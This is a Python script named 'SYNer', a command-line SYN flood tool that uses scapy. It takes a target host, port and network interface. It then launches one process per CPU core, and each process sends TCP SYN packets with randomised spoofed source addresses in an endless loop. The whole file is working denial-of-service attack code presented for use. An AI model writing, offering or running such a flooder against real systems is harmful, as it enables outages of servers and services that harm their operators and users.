# This is a TCP SYN flood which can cause a problem for servers
import getopt
import sys
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import multiprocessing
from multiprocessing import Process

def usage(): 
	print (
"""
SYNer SYN Flood Tool 
AT ANY TIME STOP THE ATTACK WITH Ctrl+C
Usage: python SYNer.py -t target_host -p target_port -i interface

   -t --target   	-Execute a DoS attack against [host]
   -h --help 		-Shows the help page for project404
   -i --interface 	-The interface that you want to use to send packets
   -p --port 		-The target port that you want to attack

Example(s):
python SYNer.py -t 192.168.1.1 -p 80 -i enp2s0
""")
	sys.exit(0)

def randomIP(): 
	randIP = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return randIP

def randomIntegers():
	x = random.randint(1000,9000)
	return x

def sendSYNs(destIp, destPort, interface):
	s = conf.L3socket(iface=interface)
	try: 
		transport_layer = TCP(sport=int(destPort), dport=int(destPort), flags="S", window=randomIntegers(), seq=randomIntegers())
		while True:
			s.send(IP(src=".".join(map(str, (random.randint(0,255)for _ in range(4)))), dst=destIp)/transport_layer)
			#s.send(packet)
	except KeyboardInterrupt:
		print ("Stopped the attack")
		sys.exit(0)
		quit()

def main():
	if not len(sys.argv[1:]):
		usage()
	try:
		opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:i:",["help","target","port","interface"])
	except getopt.GetoptError as err:
		print (str(err))
		usage()

	destinationIp   = None
	interface       = None
	targetPort      = None
	for o,a in opts:
		if o in ("-h", "--help"):
			usage()
		elif o in ("-t","--target"):
			destinationIp = a
		elif o in ("-i","--interface"):
			interface = a
		elif o in ("-p","--port"):
			targetPort = a
		else:
			assert False, "Unhandled option"

	if not destinationIp or not interface:
		usage()
	else:
		for cpus in range(multiprocessing.cpu_count()):
			synSender = Process(name="wearySYNer%i" % (cpus), target=sendSYNs, args=(destinationIp, targetPort, interface))
			synSender.daemon = True
			synSender.start()
		print ("[+] Starting attack...")
		while True:
			try:
				time.sleep(.1)
			except KeyboardInterrupt:
				print ("[+] Stopped the attack")
				synSender.terminate()
				sys.exit(0)
				quit()
main()